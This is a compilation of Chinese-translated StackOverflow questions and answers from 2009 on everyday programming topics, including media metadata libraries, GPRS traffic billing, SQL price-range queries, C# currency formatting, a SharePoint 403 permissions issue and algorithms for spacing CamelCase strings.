# StackOverflow 问答 000484000-000484999

# java - 媒体分析java库

> ID：484009
> 
> 赞同：1
> 
> 时间：2009-01-27T16:12:22.247
> 
> 标签：java, groovy, media, analysis

作为一个“学习 Groovy”项目，我正在开发一个网站来管理我的媒体收藏（MP3、MP4、AVI、OGG），但我找不到任何开源库来从这些文件中检索元数据。我在想像Linux的文件命令之类的东西。我在 Java 上发现很少有库可以做一个或另一个（如 mp3info），但即使只是音乐文件也不是一个完整的解决方案。这样的图书馆存在吗？这会成为另一个爱好项目吗？感谢您的回答

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-28T13:15:26.753

您可以尝试[Entagged](http://entagged.sourceforge.net/) Library 从媒体文件中获取元数据

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-28T13:28:36.617

如果您愿意执行外部进程，[ExifTool](http://www.sno.phy.queensu.ca/~phil/exiftool/)可以从几乎所有发明的文件格式中提取元数据。尽管有这个名字，它可以从不仅仅是带有 exif 标签的 jpg 中提取元数据。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-28T16:45:21.400

作为最后的手段，你可以使用 mplayer 的转储：

```
mplayer -identify -frames 0 filename 
```

# network-protocols - GPRS网络计费流量计算

> ID：484022
> 
> 赞同：1
> 
> 时间：2009-01-27T16:13:40.530
> 
> 标签：network-protocols, billing, gprs

我正在使用通过 GPRS 进行通信的分布式应用程序。我使用 UDP 数据包发送业务数据并使用 ICMP ping 来验证连接性。现在我在计算提供商将向我收费的流量时遇到问题。我必须考虑以下因素：

1.  UDP 有效负载：这很明显。
2.  UDP 开销：UDP 头 + IP 头 = 8 + 20 字节。
3.  没有数据的 ICMP 回显请求：IP 标头 + ICMP 有效负载 = 28 字节。
4.  ICMP 回显回复：如 3。

上面的意思是，对于每个数据包，我需要为有效载荷 + 28 个字节和每个 ping 56 个字节付费。我是对的还是我错过/误解了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-02-02T18:43:34.307

您可能还需要确定您的 GPRS 网络提供商是否会为通过他们的网络封装您的数据包而产生任何开销。

虽然 GPRS 本质上是一个 IP 网络，但他们*可能会*尝试向您收取链路层流量的费用，而不仅仅是您的实际有用数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-03-05T12:55:25.663

这也取决于网络中使用的报头压缩方案的类型。在 IPv4 的情况下，IP、UDP 和 RTP 的开销为 40 字节，在 IPv6 的情况下为 60 字节。如果使用 IPHC 或 CRTP，它们最多可以压缩 2 个字节。如果ROHC被网络使用，它应该将40字节或60字节的开销压缩为1或3字节。在这种情况下，开销将大大减少。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-04-17T10:50:28.593

答案是在我主要与计算实际网络流量的困难有关之前完成的。但是您必须了解运营商的不同收费政策。

GPRS 字节计费可能因日间、地理区域、目的地地址、折扣、费率计划、附加服务、四舍五入等而有很大差异，只有您的移动运营商知道所有此类计费规则。如果你想要精确的结果，你必须知道这一切。

考虑到如此庞大的信息量是非常困难的，并且需要建立自己的“小计费系统”。

# java - 没有毫秒的 DateFormat

> ID：484027
> 
> 赞同：3
> 
> 时间：2009-01-27T16:14:40.963
> 
> 标签：java

这可能是一个简单的问题，但我似乎无法找到解决方案。

我有一个 8 位长（纪元秒）的时间字符串，当我尝试使用 Java DateFormat 对其进行格式化时，它总是假设我的时间也包含毫秒，因此 16315118 转换为：4:31:55.118 而不是正确时间为 19:58:38。

我不想在毫秒内编辑要添加的字符串，那么我该怎么做呢？

我也不想乘以 1000，因为我使用它来格式化包括毫秒在内的其他时间。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-27T16:18:04.530

Java Date 是自纪元以来的毫秒数。在将其转换为日期之前，将您的值乘以 1000。然后，您可以通过使用您想要的格式字符串创建一个新的[SimpleDateFormat](http://java.sun.com/j2se/1.5.0/docs/api/java/text/SimpleDateFormat.html)来自定义您使用的 DateFormat 。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-27T16:28:31.530

> 我也不想乘以 1000，因为我使用它来格式化包括毫秒在内的其他时间。

你运气不好。您不能使用相同的 DateFormat 来格式化两个不同的时间值。要么使用两种不同的格式化程序，要么（更正确地）转换您的时间值。

您的时间值应该以毫秒为单位，因为这是 API 所期望的。其他任何东西都是黑客

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-27T16:17:34.623

乘以 1000 然后砍掉字符串的最后 4 个字符？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-27T16:17:19.850

[您可以在此处](http://java.sun.com/j2se/1.4.2/docs/api/java/text/SimpleDateFormat.html)从 Javas API 中找到答案

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-11-10T04:16:43.530

# sql - 如何创建“按价格过滤”类型的查询？

> ID：484036
> 
> 赞同：3
> 
> 时间：2009-01-27T16:16:29.090
> 
> 标签：sql, filtered-lookup

我正在使用 VBScript (ASP Classic) 和 SQL Server；我正在尝试在网站上设置一个部分，您可以在其中查看特定价格水平的产品数量。就像是：

```
$50 - $100 (4)
$100 - $500 (198)
$500 - $1000 (43) 
```

看在我的份上，我想不出一个很好的方法来做这样的查询。我的意思是......我知道如何在某个价格范围内获取产品数量，但我无法弄清楚如何在几个不同的价格范围内做到这一点，而无需编写大量嵌套查询来聚合所有结果，特别是因为相关产品的价格范围可能有很大差异。

在做这样的事情时，是否有“经验法则”来确定不同的价格范围？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-27T16:32:58.743

表驱动它：

```
SELECT pr.MinPrice, pr.MaxPrice, COUNT(*)
FROM Products AS p
INNER JOIN PriceRanges AS pr
    ON p.UnitPrice BETWEEN pr.MinPrice AND pr.MaxPrice
GROUP BY pr.MinPrice, pr.MaxPrice
ORDER BY pr.MinPrice, pr.MaxPrice 
```

如果您需要不同产品类别的不同价格范围：

```
SELECT pr.ProductCategory, pr.MinPrice, pr.MaxPrice, COUNT(*)
FROM Products AS p
INNER JOIN PriceRanges AS pr
    ON p.ProductCategory = pr.ProductCategory
    AND p.UnitPrice BETWEEN pr.MinPrice AND pr.MaxPrice
GROUP BY pr.ProductCategory, pr.MinPrice, pr.MaxPrice
ORDER BY pr.ProductCategory, pr.MinPrice, pr.MaxPrice 
```

您将不得不添加一些清理并处理范围的末尾。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T16:51:20.907

在 SQL 中执行此操作的最有效方法（我相信）是使用`sum case`构造：

```
select  sum(case when Price >= 50 and Price < 100 then 1 else 0 end) as 50to100,
        sum(case when Price >= 100 and Price < 500 then 1 else 0 end) as 100to500,
        sum(case when Price >= 500 and Price < 1000 then 1 else 0 end) as 500to1000
from    Products 
```

这只需要对表进行一次扫描。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-27T16:25:12.300

您可以使用联合查询

```
SELECT '100 - 200', COUNT(*) FROM Products
WHERE Price >= 100 AND Price <= 200
UNION
SELECT '300 - 400', COUNT(*) FROM Products
WHERE Price >= 300 AND Price <= 400 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-27T16:26:34.590

创建将价格范围与值相关联的函数 (UDF)

```
$50 - $100 = 1
$100 - $500 = 2
$500 - $1000 = 3 
```

等等

然后按值列上的函数进行选择分组。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-27T16:26:37.320

我可能会使用一个 SQL 函数，它根据值为每条记录分配一个类别代码，然后按类别代码和计数分组。

# sql - 在 MS SQLServer 中交换两行保留原始主键且无需手动更新

> ID：484040
> 
> 赞同：3
> 
> 时间：2009-01-27T16:17:51.737
> 
> 标签：sql, sql-server, constraints, sql-update

我有以下问题：我有像

```
ID   CODE     NAME            .........
1    h1100h1  Cool example1   .........
2    h654441  Another cool1   ......... 
```

我想交换它们，保留所有旧的主键和约束。当然，我可以通过更新行轻松地手动解决这个问题。我有点想知道是否有人对此类问题有任何出色的解决方案，而不仅仅是手动执行更新命令。我真的非常感谢任何建议或建议。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-01-27T19:12:49.433

我没有对此进行测试，但我认为它会起作用。我假设 id 是单列主键。如果不是这种情况，那么您将需要稍微调整此代码以处理 PK。

```
UPDATE
     T1
SET
     column_1 = T2.column_1,
     column_2 = T2.column_2,
     ...
FROM
     dbo.My_Table T1
INNER JOIN dbo.My_Table T2 ON
     T2.id =
          CASE
               WHEN T1.id = @id_1 THEN @id_2
               WHEN T1.id = @id_2 THEN @id_1
               ELSE NULL
          END
WHERE
     T1.id IN (@id_1, @id_2) 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2009-01-27T16:37:50.620

自我加入更新是您唯一安全的选择

# c# - string.Format "C" (currency) 返回字符串 "C" 而不是格式化文本

> ID：484048
> 
> 赞同：4
> 
> 时间：2009-01-27T16:19:31.657
> 
> 标签：c#, format

我试图确保从 TextBox 派生的控件中的文本始终格式化为货币。

我已经像这样覆盖了 Text 属性。

```
 public override string Text
    {
        get
        {
            return base.Text;
        }
        set
        {                
            double tempDollarAmount = 0;
            string tempVal = value.Replace("$", "").Replace(",","");
            if (double.TryParse(tempVal, out tempDollarAmount))
            {
                base.Text = string.Format("C", tempDollarAmount);
            }
            else
            {                 
                base.Text = "$0.00";
            }                
        }
    } 
```

结果：

*   如果我传递值 "Text" (AmountControl.Text = "Text";) ，我的测试页面上的控件文本将按预期设置为 "$0.00"。
*   如果我传递值 7 (AmountControl.Text = "7";) ，我希望看到 "$7.00"，但我的测试页上的控件文本设置为 "C"。

我假设我在这里遗漏了一些非常简单的东西。是关于财产的吗？还是我错误地使用了字符串格式方法？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-01-27T16:22:06.003

而不是“C”放“{0：c}”

有关更多字符串格式问题，请转到[此处](http://blog.stevex.net/index.php/string-formatting-in-csharp/)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-27T16:22:38.843

您也可以使用 tempDollarAmount.ToString("C")。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-27T16:22:18.890

需要为“{0:C}”

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-27T16:22:44.083

它应该是“{0:C}”

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-27T16:22:57.983

是的，应该是：

```
base.Text = string.Format("{0:C}", tempDollarAmount); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-01-27T16:24:22.597

它应该是：

```
base.Text = string.Format("{0:C}", tempDollarAmount); 
```

并且请不要使用双精度表示货币，而是使用小数。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2012-01-10T13:34:04.360

它应该是：

```
Console.WriteLine("The value 99999 in various Format");
String s = "$";
String s1=s.Replace(s,"RS");
String s2 = String.Format("{0:c}", s1);
String s3="1000";
Console.WriteLine(s2 + s3); 
```

# sharepoint - 用户收到 403 错误（用户拥有完全控制权限）

> ID：484064
> 
> 赞同：1
> 
> 时间：2009-01-27T16:22:47.623
> 
> 标签：sharepoint, sharepoint-2007

我们有一个依赖于发布功能的新闻系统。它基本上是开箱即用的新闻，有一些小的变化。该页面包含一个页面内容区域。我会给出一些屏幕截图来帮助说明我的观点。

**一、页面内容区：**

[页面内容区 http://img216.imageshack.us/img216/460/pagecontentxm2.png](http://img216.imageshack.us/img216/460/pagecontentxm2.png)

当您在内容区域内单击时，会添加一个工具栏。如果要将图像添加到内容中，请单击突出显示的按钮（这是用户尝试执行的操作）：

[图片按钮 http://img218.imageshack.us/img218/9786/pagecontentwithtoolbarwc9.png](http://img218.imageshack.us/img218/9786/pagecontentwithtoolbarwc9.png)

单击图像按钮后，将出现一个对话框。当用户单击**浏览** 按钮时，他会收到**403 错误**。

[图片属性 http://img218.imageshack.us/img218/3779/imagedialogxl1.png](http://img218.imageshack.us/img218/3779/imagedialogxl1.png)

正如我在主题中所说，用户具有***完全控制***权限。

我深入研究了 IIS 日志，发现此页面抛出 403：/ _layouts/ **AssetPortalBrowser.aspx**

当用户单击浏览按钮时，应该让他们浏览到此文档库： **/Information/News/PublishingImages**

如果您会在对话框（第三张图片）中注意到浏览路径是空白的。如果用户粘贴到图像库的路径，则不会发生错误。

**有人知道如何解决这个 403 错误吗？**它只发生在这个用户身上，并且最近才开始。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-27T20:07:18.530

我认为 AssetPortalBrowser.aspx 正在调用对象模型以尝试获取数据以填写文件列表。如果是这种情况，并且页面没有为文件库获取正确的值以获取图像，则页面将尝试为项目列表使用默认值。如果该用户没有默认位置的权限，则可能会导致 403。

这都是猜测，但 Fiddler 没有显示 AssetPortalBrowser.aspx 请求任何其他页面资产。

我直接在浏览器窗口中键入 /_layouts/AssetPortalBrowser.aspx 的简短实验始终默认为文档库。该库与在打开页面之前立即浏览的站点没有任何关系，因此它可能将默认 URL 存储在某个地方，并且可能是完全不同的位置。

最好的办法是尝试追踪最近对该用户权限的任何更改（即减少）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-17T09:46:03.290

我最近写了一篇关于这个主题的博客

您需要一组特定的权限才能使用 AssetPortalBrowser 进行浏览。棘手的是，这些权利必须在站点级别授予，仅将这些权利授予图书馆是不够的。第二个问题是 AssetPortalBrowser 会记住您上次浏览的 url。因此，您当前添加权限的站点可能不是生成 403 错误的站点。

[http://autoexe.blogspot.com/2009/03/assetportalbrowser-403-access-denied.html](http://autoexe.blogspot.com/2009/03/assetportalbrowser-403-access-denied.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-27T16:51:00.050

[这](http://www.checkupdown.com/status/E403.html)可能会有所帮助。还可以使用 fiddler 来查看失败时的请求到底是什么。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-27T16:52:25.943

尝试进一步缩小范围：

*   当该用户在其浏览器的地址栏中键入 URL [http://yoursite/_layouts/AssetPortalBrowser.aspx时会发生什么？](http://yoursite/_layouts/AssetPortalBrowser.aspx)

*   是浏览器无法访问 AssetPortalBrowser.aspx（= IIS 中的错误配置）还是 AssetPortalBrowser.aspx 试图访问其他内容（因此 AssetPortalBrowser.aspx 正在报告错误）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-27T16:59:04.947

403 的子状态代码是什么？这通常显示为 IIS 日志中 403 之后的数字。

下表应有助于确定此 403 的根本原因：

```
None  Access is denied. 
1 Execute access is denied.
2 Read access is denied.
3 Write access is denied.
4 SSL is required to view this resource.
5 SSL 128 is required to view this resource.
6 IP address of the client has been rejected.
7 SSL client certificate is required.
8 DNS name of the client is rejected.
9 Too many clients are trying to connect to the Web server.
10 Web server is configured to deny Execute access.
11 Password has been changed.
12 Client certificate is denied access by the server certificate mapper.
13 Client certificate has been revoked on the Web server.
14 Directory listing is denied on the Web server.
15 Client access licenses have exceeded limits on the Web server.
16 Client certificate is ill-formed or is not trusted by the Web server.
17 Client certificate has expired or is not yet valid.
18 Cannot execute requested URL in the current application pool.
19 Cannot execute CGIs for the client in this application pool.
20 Passport logon failed. 
```

（来源：[HTTP 403.x-Forbidden (IIS 6.0)](http://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/21079107-1740-470e-a933-23a45494b8ba.mspx?mfr=true "HTTP 403.x-禁止 (IIS 6.0)")）

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-28T16:36:30.030

如果它是一个系统库，那么是的，它可能应该继承。系统库的描述中通常有类似“这个库是由发布功能创建的”的内容。

至少，您可以写下现有的权限，然后继承。如果这不能解决问题，你可以把旧的放回去——没有伤害，没有犯规。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-01-28T16:37:34.600

具体来说，不是继承使它工作 - 它对库具有读取访问权限。如果它没有 inerit 但您的用户仍然可以访问它，那么该库不是问题。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-01-28T15:33:07.177

我正是这个问题。在四处挖掘并在组之间移动人员以查看哪些组受到影响以及哪些组没有受到影响之后，我发现您至少需要对位于集合根目录的“站点集合文档”库具有“读取”权限。为什么这个库很特别并且没有继承权限让我难以理解......

作为站点管理员，从主门户页面：站点设置 -> 站点库和列表 -> 自定义“站点集合文档”。让这个库从它的父级继承权限，然后突然就可以工作了。当你在那里时，还要检查“网站收集文件”。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-01-28T16:14:48.827

伤不起。还要检查“网站集图像”库，因为您的原始错误提到了“PublishingImages”库。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-01-28T16:20:03.557

进一步的想法：我设法通过将我的测试用户添加到 Portal Owners 组中来诊断这个问题，然后检查 Browse 是否在摘要链接 webpart 中工作（确实如此）。如果同样的测试对您有用，则意味着门户所有者可以访问普通用户无法访问的内容。如果是这种情况，我会检查根级别的每个库（与上述相同的技术），寻找常规使用无法访问的库。

此外，在摘要链接 webpart 中并添加新链接时，有两个浏览按钮：一个转到正在讨论的页面，一个转到 PortalImagePicker.aspx。这第二个按钮对您的用户有用吗？还是都给403 Forbidden？

# asp.net - ASP.Net：忽略 Windows 身份验证

> ID：484068
> 
> 赞同：0
> 
> 时间：2009-01-27T16:23:12.303
> 
> 标签：asp.net, security, windows-authentication, basic-authentication

我有一个需要使用“基本身份验证”的应用程序；但是，为了让您在 Visual Studio 中调试应用程序，IIS 要求该目录也启用“Windows 身份验证”。

问题是我的用户处理程序尝试发送基本身份验证请求以将它们与数据库进行比较......但是由于上述“Windows 身份验证”，IIS 插入到标头中的 NTLM 请求将基本身份验证请求的优先级推低'，所以它会被用户发送到服务器。

有没有人遇到过这种情况？有没有办法在 Visual Studio 中进行调试而无需启用 Windows 身份验证（或至少阻止它请求请求的安全性）？

谢谢！

编辑：忘了提，在开发环境之外，“windows 身份验证”不会启用

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-27T16:38:32.413

[核实...](http://mvolo.com/blogs/serverside/archive/2006/12/28/Fix-problems-with-Visual-Studio-F5-debugging-of-ASP.NET-applications-on-IIS7-Vista.aspx)

我总是通过附加到进程来调试我的网络应用程序。

# user-interface - 是否有任何工具可以在 C#2.0 中使用来自 xml 的自动 winform UI 生成器

> ID：484069
> 
> 赞同：1
> 
> 时间：2009-01-27T16:23:15.347
> 
> 标签：user-interface, c#-2.0

我有以下要求：在 C#2.0 中，给定 xml 格式的设备配置和架构自动创建显示 xml 的 UI。此 ui 可以更改 xml 并需要对架构执行验证。

我想到了一个为每个 xpath 定义如何在 UI 中显示它的文件（以及未指定元素的默认行为）。

有谁知道 C#2.0 中现有的解决方案生成 winform 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-17T16:25:07.490

一种方法是使用 XSLT 以您想要的方式转换 XML。您可以将其转换为 HTML 并将输出放入 Windows 窗体 WebBrowser 控件。或者您可以使用 XSLT 将您的 XML + XSD 转换为 XAML。

或者，您可以使用 XAML 作为您的 XML 语言，并且您不需要自己的架构，因为您将使用 XAML 架构。

编辑：这篇文章 -[动态生成的 XML 数据编辑器](http://www.codeproject.com/KB/system/xmldataeditor.aspx)- 代码项目听起来最接近您的需要。

# php - PHP数组问题

> ID：484072
> 
> 赞同：0
> 
> 时间：2009-01-27T16:23:34.863
> 
> 标签：php, arrays

我正在用 PHP 编写一个脚本，根据调查中相同答案的数量来比较人们。我使用这样的数组：

[*个人ID* ]=>*答案数相同*

存储与我比较的人最近的 10 个人。

我需要弄清楚如何找到 10*个相同答案*中的最低值并覆盖更高*数量的相同答案*并用它修改*人员 ID*密钥。

有什么帮助吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-27T16:33:32.360

听起来您可以很容易地在 SQL 中解决这个问题，但需要在 PHP 中完成大量工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T16:37:35.067

按相同答案的数量对数组进行排序不是更容易吗？甚至可能只是添加新人，使用数组并删除第一个/最后一个..

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-27T16:47:55.343

您需要根据 delta 对条目进行排序`person.number_of_answers`。例如。：

```
function cmp_by_delta($a, $b) {
  if ($a->delta == $b->delta) {
    return 0;
  }
  return ($a->delta < $b->delta) ? -1 : 1;
}
// calculate delta for each entry
foreach ($entries as $person) {
  $person->delta = abs($target_person->number_of_answers - $person->number_of_answers);
}
// sort entries by delta
usort($entries, 'cmp_by_delta');
// take 10 first matches from sorted array
$10_best_matches = array_slice($entries, 0, 10); 
```

当然，这可以在数据库中更漂亮、更高效地完成：

```
select * from people
order by abs(number_of_answers - :target_number_of_answers)
limit 10; 
```

# .net - 为什么 System.Object 在 .NET 中不是抽象的？

> ID：484080
> 
> 赞同：10
> 
> 时间：2009-01-27T16:25:35.420
> 
> 标签：.net, oop

我知道它通常用作锁定对象，但这真的是充分的理由吗？是什么意思

```
object o = new object(); 
```

非抽象类是代表实际对象的东西。“asdasdf”是一个字符串。“对象”类的实际实例是什么？这是没有意义的，OOP 明智的。我的问题是它的存在是否有一些实际原因（除了用作锁定对象之外）。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-01-27T16:30:06.987

回答这个问题的最简单方法是问另一个问题：Object 类有什么抽象的原因吗？因为没有理由让它是抽象的，所以它不是。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2009-01-27T16:30:10.463

有时您只需要一个对象，而不需要其他任何东西，例如在使用随机引用类型来实现多线程锁之类的事情时。不使对象抽象允许在这些情况下使用。Monitor.Enter 和 Monitor.Exit 类（这是 C# 中“lock”关键字背后的基础）可以获取任何给定对象的锁，而不管实现如何。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2009-01-27T17:20:37.023

当然，一个类是抽象的意味着它具有一些需要实现的功能......

System.Object 做了它需要做的一切，因此它不是抽象的。

我认为您误解了为什么将事物抽象化，这是因为它们包含一些有用的功能，并且没有规定您如何实现其功能的某些部分。

从本质上讲，它们是半成品类，就像一个模型套件，您可以对其进行自定义以按照您想要的方式工作，但您不必从头开始滚动整个东西。

它们的存在并不是为了阻止您创建它们的实例。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-01-27T17:06:22.467

这实际上在 System.Windows.Forms 中使用了很多，其中创建了普通的旧 System.Object 实例以充当每个 Control 实例字典的键，用于事件处理程序和属性值之类的事情。将其视为穷人的 DependencyProperty，但没有围绕它构建的所有机制（因此无需定义像 DependencyProperty 类这样的抽象）。

CLR 甚至可能为优化普通旧 System.Object 实例的内存使用提供某种支持，因为只有几个场景可以有益地使用它们。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-09-29T19:52:13.110

它不应该有一个公共构造函数，而且我认为它应该是抽象的。对象类是所有 .net 对象的基础，它本身没有任何目的（好的，锁定......但我更喜欢有一个类 Lock : object 并且问题解决了）。“因为它不需要抽象”的借口很糟糕。我们应该有理由使类具体而不是抽象。我们没有任何理由让它具体化，所以......它不应该，因为这个类的主要目的是“被所有其他类继承”。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-01-27T16:30:49.060

是的，这就足够了。要么允许创建对象，要么必须为每个结构创建类，这些结构只是在寻找可以引用的静态指针。我的猜测是还有其他地方使用它。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-07-29T10:11:34.750

首先，假设对象类被声明为一个抽象，带有一些抽象方法，如 toString、Equals 等。这意味着在创建新类时必须强制重写此方法，因为对象类隐式继承到任何类。

毕竟，在所有新类中强制编写代码以覆盖可能根本不需要多次的基本方法是没有任何意义的。如果你想创建大多数非抽象的方法，那么创建这样的类有什么意义呢？

这就是为什么它是具体的类而不是抽象的。

# algorithm - “spacify” CamelCased 字符串的算法

> ID：484085
> 
> 赞同：3
> 
> 时间：2009-01-27T16:26:37.493
> 
> 标签：algorithm, language-agnostic, string

非常基本，我只是好奇其他人如何实现这个算法，并想看看是否有任何聪明的技巧来优化算法......我只需要为我正在从事的项目实现这个。

给定 CamelCase 中的字符串，您将如何“分隔”它？

例如，给定**FooBarGork**我想要**Foo Bar** Gork回来。

这是我在 C# 中的算法：

```
 static void Main(string[] args)
{
    Console.WriteLine(UnCamelCase("FooBarGork"));
}
public static string UnCamelCase(string str)
{
    StringBuilder sb = new StringBuilder();
    for (int i =  0; i < str.Length; i++)
    {
        if (char.IsUpper(str, i) && i > 0) sb.Append(" ");
        sb.Append(str[i]);
    }
    return sb.ToString();
} 

```

由于您必须访问每个角色一次，我相信最好的情况是 O(n)。你将如何实现这一点？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2009-01-27T16:33:55.870

我已经能感觉到火焰，但我喜欢这种东西的正则表达式。

```
public static string UnCamelCase(string str)
{
    return Regex.Replace(str, "([a-z])([A-Z])", "$1 $2");
} 
```

（这可能不会比您的实施快，但对*我*来说更清楚。）

显然，这会更快（在运行时）

```
private static Regex _unCamelRegex = new Regex("([a-z])([A-Z])", RegexOptions.Compiled);

public static string UnCamelCase(string str)
{
    return _unCamelRegex.Replace(str, "$1 $2");
} 
```

这将处理[下面](https://stackoverflow.com/questions/484085/an-algorithm-to-spacify-camelcased-strings/484120#484120)Pete Kirkham 提出的问题（就像 HTTPRequest 这样的驼峰式字符串而言）：

```
private static Regex _unCamelRegex1 = new Regex("([a-z])([A-Z])", RegexOptions.Compiled);
private static Regex _unCamelRegex2 = new Regex("([A-Z]+)([A-Z])([a-z])", RegexOptions.Compiled);

public static string UnCamelCase(string str)
{
    return _unCamelRegex2.Replace(_unCamelRegex1.Replace(str, "$1 $2"), "$1 $2$3");
} 
```

这个拿`HTTPRequestFOOBarGork`回来`HTTP Request FOO Bar Gork`

* * *

因此，我使用 OPs 实现（使用“从 1 开始并跳过 > 0 检查”更改）和我的第二个回复（带有静态编译 Regex 对象的那个）测试了迭代方法与正则表达式方法。请注意，结果不包括 Regex 的编译时间。对于 200 万次调用（使用相同的 FooBarGork 输入）：

**迭代：** 00: 00:00.80 正则
**表达式：** 00:00:06.71

所以很明显，迭代方法效率更高**。**我已经包含了一个固定版本的 OPs 实现（[正如](https://stackoverflow.com/questions/484085/an-algorithm-to-spacify-camelcased-strings/484129#484129)Jason Punyon 所建议的，任何功劳都应该归功于他），它还考虑了一个 null 或空参数：

```
public static string UnCamelCaseIterative(string str)
{
    if (String.IsNullOrEmpty(str))
        return str;

    /* Note that the .ToString() is required, otherwise the char is implicitly
     * converted to an integer and the wrong overloaded ctor is used */
    StringBuilder sb = new StringBuilder(str[0].ToString());
    for (int i = 1; i < str.Length; i++)
    {
        if (char.IsUpper(str, i))
            sb.Append(" ");
        sb.Append(str[i]);
    }
    return sb.ToString();
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-27T16:36:01.280

为什么不从 1 开始？

您将消除 && i>0 检查...

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-27T16:58:16.897

这是一个 PHP 示例

```
function spacify($str) {
  return preg_replace('/([a-z])([A-Z])/', "\1 \2", $str);
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-27T16:37:36.363

通常我的十进制方法有点复杂，因为“HTTPRequest”应该变成“HTTP Request”而不是“HTTP Request”，并且不同的应用程序处理数字也不同。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2011-08-09T14:43:00.573

```
echo "FooBarGork" | sed -r 's/([A-Z])/ \1/g;s/^ //' 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-27T16:52:41.450

以下是 mootools javascript 库的操作方式（尽管它们会“连字符”，但很容易将连字符换成空格。

```
/*
Property: hyphenate
    Converts a camelCased string to a hyphen-ated string.

Example:
    >"ILikeCookies".hyphenate(); //"I-like-cookies"
*/

hyphenate: function(){
    return this.replace(/\w[A-Z]/g, function(match){
        return (match.charAt(0) + '-' + match.charAt(1).toLowerCase());
    });
}, 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-01-27T16:39:21.053

像这样的东西（Python）？

```
>>> s = 'FooBarGork'
>>> s[0] + re.sub(r'([A-Z])', r' \1', s[1:])
'Foo Bar Gork' 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-01-27T16:41:19.163

不是很令人兴奋，但是：

```
 public static string UnCamelCase(string str)
    {
        StringBuilder sb = new StringBuilder();

        foreach (char c in str.ToCharArray())
        {
            if (System.Convert.ToInt32(c) <= 90) sb.Append(" ");
            sb.Append(c);
        }
        return sb.ToString().Trim();
    }

        //Console.WriteLine(System.Convert.ToInt32('a')); // 97
        //Console.WriteLine(System.Convert.ToInt32('z')); // 122
        //Console.WriteLine(System.Convert.ToInt32('A')); // 65
        //Console.WriteLine(System.Convert.ToInt32('Z')); // 90 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-01-27T16:35:05.213

查看您的代码，它似乎以某种方式被破坏了（当您复制它时）。除了修复 for 循环之外，我假设您只是缺少一个带有 char.IsUpper 调用的 if 语句`sb.Append(" ")`。否则当然没问题。对于通用字符串，您不会比 O(n) 更好。

现在显然有一个单行 RegEx 替换调用来完成此操作，但实际上没有理由为如此简单的任务做这样的事情。出于可读性的目的，始终最好避免使用 RegEx。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-01-27T16:35:37.397

我可能会以类似的方式进行操作，只是可能不是使用字符串生成器：

```
str=str.replace(str[i], " "+str[i]); 
```

我很确定你的方式最终会更有效率。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2009-01-27T16:36:32.137

我会去...

```
public static string UnCamelCase(string str) {
    Regex reg = new Regex("([A-Z])");

    return reg.Replace(str, " $1").Trim();
}
```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2009-01-27T16:36:51.293

一些正则表达式风格知道“\u”（大写）和“\U”（小写）字符类。他们可以替换这个：

```
(?<=\U)(?=\u) 
```

有一个空格。对于那些你可能不知道这些课程的人，这将是：

```
(?<=[a-z])(?=[A-Z])   // replace with a single space again 
```

